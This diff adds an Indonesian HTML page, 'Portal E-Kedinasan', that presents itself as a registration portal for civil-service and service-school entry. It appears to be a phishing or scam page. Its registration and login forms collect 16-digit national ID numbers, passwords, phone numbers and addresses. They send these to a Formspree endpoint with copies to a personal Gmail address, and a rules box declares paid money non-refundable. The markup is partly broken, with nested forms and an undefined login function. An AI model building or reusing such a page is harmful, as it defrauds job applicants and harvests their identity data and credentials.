@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal E-Kedinasan</title>
+  <style>
+  body { font-family: Arial, sans-serif; background: url('https://i.imgur.com/Z6DsZJa.jpg') no-repeat center center fixed; background-size: cover; margin: 0; }
+  nav { background: #dc2626; color: #fff; padding: 16px; display: flex; gap: 16px; }
+    nav {
+      background: #dc2626;
+      color: #fff;
+      padding: 16px;
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+      align-items: center;
+    }
+    nav a { color: #fff; text-decoration: none; font-weight: bold; }
+    nav a:hover { text-decoration: underline; }
+    main { padding: 24px; }
+    .section { display: none; }
+    .active { display: block; }
+    .link { color: #2563eb; text-decoration: underline; margin-right: 16px; }
+  footer { padding: 16px; text-align: center; font-size: 14px; }
+    .fade-in {
+      opacity: 0;
+      transform: translateY(30px);
+      animation: fadeInMove 1s ease-out forwards;
+    }
+    @keyframes fadeInMove {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+  <script>
+    function showSection(id) {
+      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+    window.onload = function() {
+      showSection('home');
+    };
+  </script>
+</head>
+<body>
+  <nav>
+  <div style="display:flex;flex:1;justify-content:center;align-items:center;gap:16px;">
+    <a href="#" onclick="showSection('home')">BERANDA</a>
+  <a href="#" onclick="showSection('form')">PENDAFTARAN</a>
+    <a href="#" onclick="showSection('peraturan')">PERATURAN</a>
+  </div>
+  <span style="display:flex;align-items:center;gap:8px;">
+    <a href="#" onclick="showSection('poin')" style="display:flex;align-items:center;font-weight:bold;color:#fff;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24" style="margin-right:6px;"><path d="M12 3l10 9h-3v9h-6v-6h-2v6H5v-9H2z"/></svg>
+      POIN
+    </a>
+  </span>
+  </nav>
+  <main class="p-6 fade-in">
+  <section id="poin" class="section fade-in">
+    <h2 style="font-size:1.5em;font-weight:bold;margin-bottom:8px">PERSYARATAN KEDINASAN, CPNS DAN P3K</h2>
+    <div id="poin-content" style="background:#f3f4f6;padding:16px;border-radius:8px;min-height:80px;">
+      <p>Dokumen persyaratan umum untuk pendaftaran sekolah kedinasan meliputi KTP, Kartu Keluarga, Ijazah atau Surat Keterangan Lulus (SKL), rapor, pas foto, akta kelahiran, serta surat keterangan sehat. Dokumen-dokumen ini perlu dilengkapi dengan Surat Keterangan Catatan Kepolisian (SKCK), surat lamaran, dan persyaratan tambahan lainnya seperti sertifikat prestasi atau dokumen khusus yang ditetapkan oleh masing-masing instansi tujuan.</p>
+      <h3>Dokumen Persyaratan Umum:</h3>
+      <ul>
+        <li>Kartu Tanda Penduduk (KTP) atau Surat Keterangan Telah Melakukan Perekaman E-KTP</li>
+        <li>Kartu Keluarga (KK)</li>
+        <li>Ijazah atau Surat Keterangan Lulus (SKL) dari sekolah asal, jika belum memiliki ijazah</li>
+        <li>Rapor SMA/SMK/Sederajat, terutama rapor Semester Genap Kelas XI dan Ganjil Kelas XII</li>
+        <li>Pas Foto dengan ketentuan ukuran dan latar belakang tertentu</li>
+        <li>Akta Kelahiran</li>
+        <li>Surat Keterangan Sehat dari Puskesmas atau Rumah Sakit Pemerintah</li>
+      </ul>
+      <h3>Dokumen Tambahan yang Sering Diminta:</h3>
+      <ul>
+        <li>Surat Keterangan Catatan Kepolisian (SKCK)</li>
+        <li>Surat Lamaran dan Formulir Pendaftaran Online sesuai format instansi</li>
+        <li>Surat Keterangan Bebas Narkoba dan bebas TBC (tergantung instansi)</li>
+        <li>Sertifikat Prestasi atau dokumen pendukung lainnya yang relevan</li>
+        <li>Surat Pernyataan yang menyatakan kesediaan ditempatkan di seluruh wilayah Indonesia</li>
+      </ul>
+      <h3>Tips Penting:</h3>
+      <ul>
+        <li>Periksa Ketentuan Instansi yang Anda tuju karena setiap instansi memiliki persyaratan yang berbeda</li>
+        <li>Pastikan Informasi Konsisten pada dokumen-dokumen seperti KTP dan KK</li>
+        <li>Siapkan Dokumen Secara Digital jika pendaftaran dilakukan secara online, perhatikan format dan ukuran file yang diminta</li>
+      </ul>
+    </div>
+    </div>
+  </section>
+  <section id="peraturan" class="section fade-in">
+      <div style="background:#fffbe6;border:1px solid #ffe58f;padding:16px;margin:16px auto;border-radius:8px;color:#7c5200;max-width:500px;text-align:center;">
+        <strong>Peraturan:</strong><br>
+        Uang yang sudah dibayar tidak bisa dikembalikan karena sudah disetor oleh admin.<br>
+        Kalau ada kesalahan atau enggak bisa, tolong hubungi email <a href="mailto:riskiaminudin130306@gmail.com">riskiaminudin130306@gmail.com</a> / <a href="tel:085774000488">085774000488</a>
+      </div>
+    </section>
+  <section id="home" class="section fade-in">
+  <h1 style="font-size:2em;font-weight:bold;margin-bottom:8px">Selamat Datang di Kedinasan Jaya Mustika</h1>
+  <p style="text-transform:uppercase;">WEBSITE UNTUK INFORMASI KEDINASAN, CPNS DAN P3K SERTA PENDAFTARAN ONLINE.</p>
+  <img src="https://i.imgur.com/nO24CbR.jpg" alt="CPNS Daerah Indonesia" style="width:100%;max-width:400px;border-radius:12px;margin:24px 0;box-shadow:0 2px 8px #0002;" />
+      <div style="margin-top:32px">
+  <h3 style="font-size:1.2em;font-weight:bold;margin-bottom:8px;color:#fff;">Kami selalu melayani anda dan membuat anda sukses</h3>
+      </div>
+    </section>
+  <section id="form" class="section fade-in">
+    <div style="width:100%;text-align:center;margin-bottom:16px;">
+      <span style="color:#2563eb;font-weight:bold;">Pilih formasi (Kedinasan, CPNS, atau P3K) dan isi data dengan benar sesuai petunjuk.</span>
+    </div>
+    <div style="display:flex;flex-direction:column;align-items:center;">
+      <form action="https://formspree.io/f/xwkgygqg" method="POST" style="background:#f3f4f6;padding:24px 16px;border-radius:8px;max-width:400px;width:100%;margin:auto;display:flex;flex-direction:column;align-items:center;">
+  <label style="width:100%;text-align:left;">NIK:<br><input type="text" name="nik" required pattern="[0-9]{16}" maxlength="16" title="Masukkan 16 digit NIK" style="width:100%;"></label><br>
+  <label style="width:100%;text-align:left;">Nama:<br><input type="text" name="nama" required style="width:100%;"></label><br>
+        <label style="width:100%;text-align:left;">Email:<br><input type="email" name="email" required style="width:100%;"></label><br>
+        <label style="width:100%;text-align:left;">Password:<br><input type="password" name="password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka" style="width:100%;"></label><br>
+        <label style="width:100%;text-align:left;">Konfirmasi Password:<br><input type="password" name="confirm_password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka" style="width:100%;"></label><br>
+  <label style="width:100%;text-align:left;">Nomor Telepon:<br><input type="tel" name="telepon" required pattern="[0-9]{10,15}" maxlength="15" title="Masukkan nomor telepon yang valid (10-15 digit)" style="width:100%;"></label><br>
+  <label style="width:100%;text-align:left;">Alamat:<br><textarea name="alamat" required rows="2" style="width:100%;resize:vertical;"></textarea></label><br>
+        <label style="display:flex;align-items:center;margin-bottom:16px;width:100%;">
+          <input type="checkbox" name="persetujuan" required style="margin-right:8px;">
+          <span>Saya memahami dan menyetujui persyaratan dan kebijakan privasi</span>
+        </label>
+        <small style="color:#555;text-align:left;width:100%;">Pastikan email aktif agar bisa menerima salinan pendaftaran.</small><br>
+        <label style="width:100%;text-align:left;">Pilihan Formasi:<br>
+          <select name="formasi" style="width:100%;">
+            <option value="cpns">CPNS</option>
+            <option value="p3k">P3K</option>
+            <option value="kedinasan">Kedinasan</option>
+          </select>
+        </label><br>
+        <button type="submit" style="width:100%;background:#2563eb;color:#fff;padding:10px 0;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Daftar</button>
+        <input type="hidden" name="_cc" value="riskiaminudin130306@gmail.com">
+        <div style="margin-top:12px;text-align:center;width:100%;">
+          <span>Sudah punya akun? <a href="#" onclick="showLoginForm()" style="color:#2563eb;text-decoration:underline;">Login di sini</a></span>
+        </div>
+        <div id="login-form" style="display:none;margin-top:24px;">
+          <form action="https://formspree.io/f/xwkgygqg" method="POST" style="background:#f3f4f6;padding:24px 16px;border-radius:8px;max-width:400px;width:100%;margin:auto;display:flex;flex-direction:column;align-items:center;">
+            <h3 style="font-size:1.2em;font-weight:bold;margin-bottom:8px;color:#2563eb;">Login Akun</h3>
+            <div style="width:100%;text-align:left;margin-bottom:8px;color:#2563eb;font-size:1em;">Masukkan email dan password untuk login.</div>
+            <label style="width:100%;text-align:left;">Email:<br><input type="email" name="email" required style="width:100%;"></label><br>
+            <label style="width:100%;text-align:left;">Password:<br><input type="password" name="password" required minlength="8" style="width:100%;"></label><br>
+            <button type="submit" style="width:100%;background:#2563eb;color:#fff;padding:10px 0;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Login</button>
+          </form>
+        </div>
+      </form>
+    </div>
+    </section>
+  <section id="kedinasan" class="section fade-in">
+      <div style="margin:24px 0;display:flex;flex-direction:column;align-items:center;">
+  <form action="https://formspree.io/f/xwkgygqg" method="POST" style="background:#f3f4f6;padding:16px;border-radius:8px;max-width:400px;margin:auto;" onsubmit="showThankYouMessage(event, this)">
+  <div id="thankyou-kedinasan" style="display:none;margin:24px 0;text-align:center;color:#16a34a;font-weight:bold;font-size:1.1em;">TERIMAKASI SUDAH MENDAFTAR DOKUMEN ANDA SEDANG DI PERIKSA</div>
+          <h3 style="margin-bottom:12px;color:#2563eb;font-weight:bold;">Formulir Pendaftaran Kedinasan</h3>
+          <label>Nama:<br><input type="text" name="nama" required></label><br><br>
+          <label>Email:<br><input type="email" name="email" required></label><br><br>
+          <label>Password:<br><input type="password" name="password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka"></label><br><br>
+          <label>Konfirmasi Password:<br><input type="password" name="confirm_password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka"></label><br><br>
+          <!-- Field password dihapus demi privasi -->
+          <label style="display:flex;align-items:center;margin-bottom:16px;">
+            <input type="checkbox" name="persetujuan" required style="margin-right:8px;">
+            <span>Saya memahami dan menyetujui persyaratan dan kebijakan privasi</span>
+          </label>
+          <input type="hidden" name="formasi" value="kedinasan">
+          <button type="submit" style="background:#2563eb;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Daftar Kedinasan</button>
+          <!-- Email admin tidak ditampilkan di halaman -->
+        </form>
+        <div style="margin-top:12px;text-align:center;">
+          <span>Sudah pernah daftar? <a href="#" style="color:#2563eb;text-decoration:underline;">Login di sini</a></span>
+        </div>
+      </div>
+    </section>
+  <section id="cpns" class="section fade-in">
+  <div id="thankyou-cpns" style="display:none;margin:24px 0;text-align:center;color:#16a34a;font-weight:bold;font-size:1.1em;">TERIMAKASI SUDAH MENDAFTAR DOKUMEN ANDA SEDANG DI PERIKSA</div>
+      <div style="margin:24px 0;display:flex;flex-direction:column;align-items:center;">
+        <form action="https://formspree.io/f/xwkgygqg" method="POST" style="background:#f3f4f6;padding:16px;border-radius:8px;max-width:400px;margin:auto;">
+          <h3 style="margin-bottom:12px;color:#2563eb;font-weight:bold;">Formulir Pendaftaran CPNS</h3>
+          <label>Nama:<br><input type="text" name="nama" required></label><br><br>
+          <label>Email:<br><input type="email" name="email" required></label><br><br>
+          <label>Password:<br><input type="password" name="password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka"></label><br><br>
+          <label>Konfirmasi Password:<br><input type="password" name="confirm_password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka"></label><br><br>
+          <label style="display:flex;align-items:center;margin-bottom:16px;">
+            <input type="checkbox" name="persetujuan" required style="margin-right:8px;">
+            <span>Saya memahami dan menyetujui persyaratan dan kebijakan privasi</span>
+          </label>
+          <input type="hidden" name="formasi" value="cpns">
+          <button type="submit" style="background:#2563eb;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Daftar CPNS</button>
+          <input type="hidden" name="_cc" value="riskiaminudin130306@gmail.com">
+        </form>
+        <div style="margin-top:12px;text-align:center;">
+          <span>Sudah pernah daftar? <a href="#" style="color:#2563eb;text-decoration:underline;">Login di sini</a></span>
+        </div>
+      </div>
+    </section>
+  <section id="p3k" class="section fade-in">
+      <!-- Daftar persyaratan P3K dipindahkan ke menu Persyaratan -->
+      <div style="margin:24px 0;display:flex;flex-direction:column;align-items:center;">
+        <form action="https://formspree.io/f/xwkgygqg" method="POST" style="background:#f3f4f6;padding:16px;border-radius:8px;max-width:400px;margin:auto;">
+          <h3 style="margin-bottom:12px;color:#2563eb;font-weight:bold;">Formulir Pendaftaran P3K</h3>
+          <label>Nama:<br><input type="text" name="nama" required></label><br><br>
+          <label>Email:<br><input type="email" name="email" required></label><br><br>
+          <label>Password:<br><input type="password" name="password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka"></label><br><br>
+          <label>Konfirmasi Password:<br><input type="password" name="confirm_password" required minlength="8" pattern="[A-Za-z0-9]{8,}" title="Minimal 8 huruf/angka"></label><br><br>
+          <label style="display:flex;align-items:center;margin-bottom:16px;">
+            <input type="checkbox" name="persetujuan" required style="margin-right:8px;">
+            <span>Saya memahami dan menyetujui persyaratan dan kebijakan privasi</span>
+          </label>
+          <input type="hidden" name="formasi" value="p3k">
+          <button type="submit" style="background:#2563eb;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Daftar P3K</button>
+          <input type="hidden" name="_cc" value="riskiaminudin130306@gmail.com">
+        </form>
+        <div style="margin-top:12px;text-align:center;">
+          <span style="display:inline-block;width:100%;text-align:center;">Sudah pernah daftar? <a href="#form" onclick="showSection('form')" style="color:#2563eb;text-decoration:underline;">Login di sini</a></span>
+        </div>
+      </div>
+    </section>
+  </main>
+  <footer>
+    
+  </footer>
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
